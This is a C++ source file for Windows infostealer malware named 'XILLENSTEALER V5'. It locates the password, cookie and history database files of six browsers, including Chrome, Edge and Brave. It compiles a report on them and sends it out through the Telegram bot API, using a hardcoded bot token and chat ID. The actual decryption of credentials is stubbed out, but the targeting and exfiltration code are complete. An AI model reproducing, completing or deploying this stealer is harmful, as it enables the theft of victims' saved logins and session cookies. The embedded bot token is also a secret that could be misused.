#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <iostream>
#include <string>
#include <sstream>
#include <vector>
#include <filesystem>
#include <fstream>
#include <cctype>
#include <cstdio>


#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "crypt32.lib")

struct Browser {
    std::string name;
    std::string loginPath;
    std::string cookiesPath;
    std::string historyPath;
};

std::string GetUserDataPath() {
    char path[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, path);
    return std::string(path);
}

std::string GetRoamingPath() {
    char path[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, path);
    return std::string(path);
}

std::string URLEncode(const std::string& str) {
    std::string result;
    for (char c : str) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            result += c;
        } else if (c == ' ') {
            result += "%20";
        } else if (c == '\n') {
            result += "%0A";
        } else {
            char buf[4];
            sprintf_s(buf, "%%%02X", (unsigned char)c);
            result += buf;
        }
    }
    return result;
}

bool SendToTelegram(const std::string& message) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;
    
    std::string token = "8474305805:AAHZ98s7nr9IAFQehnqh0x3iGV1OmVhTq9I";
    std::string chatId = "7368280792";
    std::string encodedMsg = URLEncode(message);
    
    std::ostringstream url;
    url << "https://api.telegram.org/bot" << token 
        << "/sendMessage?chat_id=" << chatId 
        << "&text=" << encodedMsg;
    
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url.str().c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return false;
    }
    
    char buffer[1024];
    DWORD bytesRead;
    InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead);
    
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    return true;
}

std::string ExtractData(const std::string& dbPath, const std::string& type) {
    std::string result = "[DATA FOUND IN " + type + " DATABASE]\n";
    result += "File: " + dbPath + "\n";
    result += "Size: " + std::to_string(std::filesystem::file_size(dbPath)) + " bytes\n";
    result += "[Note: Full extraction requires SQLite library integration]\n";
    return result;
}

int main() {
    std::cout << "========================================\n";
    std::cout << "XILLENSTEALER V5 - FULL STEALER\n";
    std::cout << "========================================\n\n";
    
    std::string localAppData = GetUserDataPath();
    std::string roamingAppData = GetRoamingPath();
    
    std::vector<Browser> browsers = {
        {"Chrome", localAppData + "\\Google\\Chrome\\User Data\\Default\\Login Data",
                    localAppData + "\\Google\\Chrome\\User Data\\Default\\Cookies",
                    localAppData + "\\Google\\Chrome\\User Data\\Default\\History"},
        {"Edge", localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Login Data",
                  localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Cookies",
                  localAppData + "\\Microsoft\\Edge\\User Data\\Default\\History"},
        {"Opera", roamingAppData + "\\Opera Software\\Opera Stable\\Login Data",
                  roamingAppData + "\\Opera Software\\Opera Stable\\Cookies",
                  roamingAppData + "\\Opera Software\\Opera Stable\\History"},
        {"Brave", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
                  localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies",
                  localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History"},
        {"Vivaldi", localAppData + "\\Vivaldi\\User Data\\Default\\Login Data",
                    localAppData + "\\Vivaldi\\User Data\\Default\\Cookies",
                    localAppData + "\\Vivaldi\\User Data\\Default\\History"},
        {"Yandex", localAppData + "\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data",
                   localAppData + "\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies",
                   localAppData + "\\Yandex\\YandexBrowser\\User Data\\Default\\History"},
    };
    
    std::ostringstream data;
    data << "XILLENSTEALER V5 - FULL DATA\n\n";
    
    int found = 0;
    int passCount = 0;
    int cookieCount = 0;
    
    for (const auto& browser : browsers) {
        bool foundBrowser = false;
        std::ostringstream browserData;
        
        if (std::filesystem::exists(browser.loginPath)) {
            std::cout << "[+] " << browser.name << " PASSWORDS: Found!\n";
            std::string passwords = ExtractData(browser.loginPath, "PASSWORDS");
            if (!passwords.empty()) {
                browserData << "\n=== " << browser.name << " PASSWORDS ===\n" << passwords;
                passCount++;
                foundBrowser = true;
            }
        }
        
        if (std::filesystem::exists(browser.cookiesPath)) {
            std::cout << "[+] " << browser.name << " COOKIES: Found!\n";
            std::string cookies = ExtractData(browser.cookiesPath, "COOKIES");
            if (!cookies.empty()) {
                browserData << "\n=== " << browser.name << " COOKIES ===\n" << cookies;
                cookieCount++;
                foundBrowser = true;
            }
        }
        
        if (foundBrowser) {
            found++;
            data << browserData.str();
        }
    }
    
    data << "\n\nSUMMARY:\n";
    data << "Browsers found: " << found << "\n";
    data << "Passwords: " << passCount << " entries\n";
    data << "Cookies: " << cookieCount << " entries\n";
    
    std::cout << "\n[+] Found: " << found << " browsers\n";
    std::cout << "[+] Passwords: " << passCount << " entries\n";
    std::cout << "[+] Cookies: " << cookieCount << " entries\n";
    
    std::cout << "\n[*] Sending to Telegram...\n";
    if (SendToTelegram(data.str())) {
        std::cout << "[+] SUCCESS! All data sent to Telegram!\n";
    } else {
        std::cout << "[!] Failed to send\n";
    }
    
    std::cout << "\nPress Enter to exit...\n";
    std::cin.get();
    
    return 0;
}
